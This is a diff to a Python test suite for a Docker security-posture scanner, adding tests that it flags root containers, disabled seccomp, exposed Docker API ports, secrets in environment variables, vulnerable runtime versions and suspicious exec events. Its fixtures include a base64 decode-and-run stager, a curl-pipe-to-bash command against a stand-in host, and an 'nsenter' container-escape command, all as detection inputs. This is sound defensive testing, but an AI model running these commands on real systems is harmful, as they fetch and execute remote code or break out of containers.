@@ -1,24 +1,28 @@
 """Container intelligence: real risk primitives, never silent absence."""
 
+import io
 import json
 import subprocess
 import sys
 import time
-import io
-from contextlib import redirect_stdout
-
-from jarvis.core import collection, assurance
 import unittest
+from contextlib import redirect_stdout
 from unittest.mock import patch
 
 from jarvis.collectors.host import containers
+from jarvis.core import assurance, collection
 
 
-def cfg(name="c", image="alpine:3.20", **host_overrides):
+def cfg(name="c", image="alpine@sha256:" + "0" * 64, **host_overrides):
+    # A hardened baseline: the flag tests below each add exactly one weakness,
+    # so a clean fixture must carry none of the posture findings.
     host = {"Privileged": False, "PidMode": "", "NetworkMode": "bridge",
-            "IpcMode": "", "CapAdd": None}
+            "IpcMode": "", "CapAdd": None, "SecurityOpt": ["no-new-privileges:true"],
+            "ReadonlyRootfs": True, "PidsLimit": 200, "Memory": 1 << 30,
+            "RestartPolicy": "unless-stopped"}
     host.update(host_overrides)
-    return {"Id": "abc123def456", "Name": f"/{name}", "Config": {"Image": image},
+    return {"Id": "abc123def456", "Name": f"/{name}",
+            "Config": {"Image": image, "User": "65532:65532", "Env": [], "Cmd": ["app"]},
             "HostConfig": host, "Mounts": [], "NetworkSettings": {"Ports": {}}}
 
 
@@ -184,7 +188,9 @@ class RunHelperTests(unittest.TestCase):
             self.assertIsNotNone(containers.inspect("abc123"))
             args = run.call_args.args[0]
             self.assertIn("unix:///var/run/docker.sock", args)
-            self.assertNotIn(".Config.Env", args[-2])
+            # Names only: the template never emits a variable's value.
+            self.assertNotIn("json .Config.Env", args[-2])
+            self.assertIn('{{json (index (split $e "=") 0)}}', args[-2])
 
 
 
@@ -262,8 +268,9 @@ class AuditTests(unittest.TestCase):
         self.assertTrue(out)
 
     def test_coverage_names_missing_and_stale_container_receipts(self):
-        from jarvis.service import coverage
         from unittest.mock import MagicMock
+
+        from jarvis.service import coverage
         store = MagicMock()
         store.get_meta.return_value = ""
         for snaps, title in (({}, "has never produced"),
@@ -305,3 +312,135 @@ class LiveIntegrationTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class PostureTests(unittest.TestCase):
+    """How far an attacker gets once inside, and how the container could have
+    been poisoned (DOCKER-ATTACK-SURFACE-2026-10-23)."""
+
+    def titles(self, c, **kw):
+        return {f["title"]: f for f in containers.assess(c, **kw)}
+
+    def hardened(self, **over):
+        return cfg(image="nats@sha256:" + "a" * 64, **over)
+
+    def test_a_hardened_container_has_no_posture_findings(self):
+        out = self.titles(self.hardened())
+        self.assertEqual([t for t in out if out[t]["severity"] != "ok"], [])
+
+    def test_root_writable_unlimited_latest_container_lists_each_weakness_low_or_medium(self):
+        c = cfg(image="ghcr.io/x/core:latest")
+        c["Config"].update({"User": "", "Env": [], "Cmd": ["server"]})
+        c["HostConfig"].update({"RestartPolicy": "always", "PidsLimit": None, "Memory": 0,
+                                "ReadonlyRootfs": False, "SecurityOpt": []})
+        out = self.titles(c)
+        self.assertEqual(out["container runs as root"]["severity"], "medium")
+        self.assertEqual(out["container has no resource limits"]["severity"], "low")
+        self.assertEqual(out["image pulled by a mutable tag"]["severity"], "low")
+        self.assertEqual(out["container root filesystem is writable"]["severity"], "low")
+        self.assertEqual(out["root container restarts unconditionally"]["severity"], "low")
+        self.assertIn("container allows privilege gain through setuid binaries", out)
+
+    def test_seccomp_unconfined_is_high_and_names_copy_fail(self):
+        out = self.titles(self.hardened(SecurityOpt=["seccomp=unconfined"]))
+        hit = out["container runs without the seccomp filter"]
+        self.assertEqual(hit["severity"], "high")
+        self.assertIn("CVE-2026-31431", hit["detail"])
+
+    def test_host_pid_with_ptrace_is_an_escape(self):
+        out = self.titles(self.hardened(PidMode="host", CapAdd=["SYS_PTRACE"]))
+        self.assertEqual(out["container can trace host processes"]["severity"], "critical")
+
+    def test_secret_env_names_are_reported_without_values(self):
+        c = self.hardened()
+        c["Config"]["Env"] = ["POSTGRES_PASSWORD=hunter2", "CLOUDFLARE_TUNNEL_TOKEN=eyJ...", "PATH=/bin"]
+        hit = self.titles(c)["secrets live in the container environment"]
+        self.assertEqual(hit["severity"], "medium")
+        self.assertIn("POSTGRES_PASSWORD", hit["detail"])
+        self.assertNotIn("hunter2", hit["detail"])
+        self.assertNotIn("eyJ", hit["detail"])
+
+    def test_stager_shaped_command_is_high(self):
+        c = self.hardened()
+        c["Config"]["Cmd"] = ["sh", "-c", "echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIHN0YWdlcg== | base64 -d | sh"]
+        self.assertEqual(self.titles(c)["container command is a decode-and-run stager"]["severity"], "high")
+        c["Config"]["Cmd"] = ["sh", "-c", "curl -fsSL http://x/i.sh | bash"]
+        self.assertIn("container command is a decode-and-run stager", self.titles(c))
+        c["Config"]["Cmd"] = ["sh", "-c", "exec nginx -g 'daemon off;'"]
+        self.assertNotIn("container command is a decode-and-run stager", self.titles(c))
+
+    def test_tunnel_client_is_named_as_internet_exposure(self):
+        c = self.hardened()
+        c["Config"]["Image"] = "cloudflare/cloudflared@sha256:" + "b" * 64
+        c["Config"]["Env"] = ["TUNNEL_TOKEN=x"]
+        out = self.titles(c)
+        self.assertEqual(out["container opens an inbound tunnel from the internet"]["severity"], "medium")
+
+    def test_old_image_is_medium_and_fresh_is_quiet(self):
+        now = 1_800_000_000
+        out = self.titles(self.hardened(), now=now, image_info={"created": now - 500 * 86400, "digests": []})
+        self.assertEqual(out["image is more than a year old"]["severity"], "medium")
+        out = self.titles(self.hardened(), now=now, image_info={"created": now - 30 * 86400, "digests": []})
+        self.assertNotIn("image is more than a year old", out)
+
+
+class HostPostureTests(unittest.TestCase):
+    def titles(self, **kw):
+        return {f["title"]: f for f in containers.host_posture(**kw)}
+
+    def test_docker_group_tcp_listener_and_defaults(self):
+        out = self.titles(info={"SecurityOptions": ["name=seccomp,profile=builtin", "name=cgroupns"],
+                                "LiveRestoreEnabled": False},
+                          group=["chris"], listeners=["0.0.0.0:2375"], versions={}, daemon_json=None)
+        self.assertEqual(out["docker group grants root-equivalent control"]["severity"], "medium")
+        self.assertIn("chris", out["docker group grants root-equivalent control"]["detail"])
+        self.assertEqual(out["Docker API listens on TCP"]["severity"], "critical")
+        self.assertEqual(out["container root is host root"]["severity"], "medium")
+        self.assertEqual(out["no mandatory access control for containers"]["severity"], "low")
+        self.assertEqual(out["live-restore is off"]["severity"], "low")
+        self.assertEqual(out["daemon runs on defaults"]["severity"], "low")
+        self.assertNotIn("default seccomp profile is not active", out)
+
+    def test_tls_port_is_high_and_userns_quiets_root_mapping(self):
+        out = self.titles(info={"SecurityOptions": ["name=seccomp,profile=builtin", "name=userns",
+                                                    "name=apparmor"]},
+                          group=[], listeners=["0.0.0.0:2376"], versions={}, daemon_json={"no-new-privileges": True})
+        self.assertEqual(out["Docker API listens on TCP"]["severity"], "high")
+        self.assertNotIn("container root is host root", out)
+        self.assertNotIn("no mandatory access control for containers", out)
+        self.assertNotIn("no-new-privileges is not the default", out)
+
+    def test_known_vulnerable_runtime_versions_are_named_and_fixed_ones_quiet(self):
+        out = self.titles(info={}, group=[], listeners=[],
+                          versions={"runc": "runc version 1.2.7", "containerd": "containerd 2.2.1",
+                                    "docker": "29.1.3"})
+        self.assertEqual(out["runc runc version 1.2.7 has a known container-escape or bypass bug"]["severity"], "critical")
+        self.assertEqual(out["containerd containerd 2.2.1 has a known container-escape or bypass bug"]["severity"], "high")
+        self.assertEqual(out["docker 29.1.3 has a known container-escape or bypass bug"]["severity"], "medium")
+        out = self.titles(info={}, group=[], listeners=[],
+                          versions={"runc": "1.3.3-0ubuntu1", "containerd": "2.2.4", "docker": "29.5.1"})
+        self.assertEqual([t for t in out if "known container-escape" in t], [])
+        self.assertEqual(containers._version("garbage"), None)
+
+    def test_plain_registry_logins_without_a_helper_are_medium(self):
+        out = self.titles(info={}, group=[], listeners=[], versions={},
+                          docker_config={"auths": ["registry.example"], "credsStore": None, "credHelpers": None})
+        self.assertEqual(out["registry credentials stored unencrypted"]["severity"], "medium")
+        out = self.titles(info={}, group=[], listeners=[], versions={},
+                          docker_config={"auths": ["registry.example"], "credsStore": "pass", "credHelpers": None})
+        self.assertNotIn("registry credentials stored unencrypted", out)
+
+
+class EventTests(unittest.TestCase):
+    def test_exec_and_create_events_are_judged(self):
+        rows = [
+            {"Type": "container", "Action": "create", "Actor": {"ID": "a" * 64, "Attributes": {"name": "web", "image": "nginx:1.27"}}},
+            {"Type": "container", "Action": "exec_create: sh -c id", "Actor": {"ID": "a" * 64, "Attributes": {"name": "web"}}},
+            {"Type": "container", "Action": "exec_create: nsenter -t 1 -m sh", "Actor": {"ID": "b" * 64, "Attributes": {"name": "db"}}},
+            {"Type": "network", "Action": "connect", "Actor": {"ID": "c", "Attributes": {}}},
+        ]
+        out = {f["title"]: f for f in containers.judge_events(rows)}
+        self.assertEqual(out["escape-shaped command executed inside db"]["severity"], "high")
+        self.assertEqual(out["2 command(s) executed inside containers"]["severity"], "low")
+        self.assertIn("web (nginx:1.27)", out["1 container(s) created"]["detail"])
+        self.assertEqual(containers.judge_events([]), [])
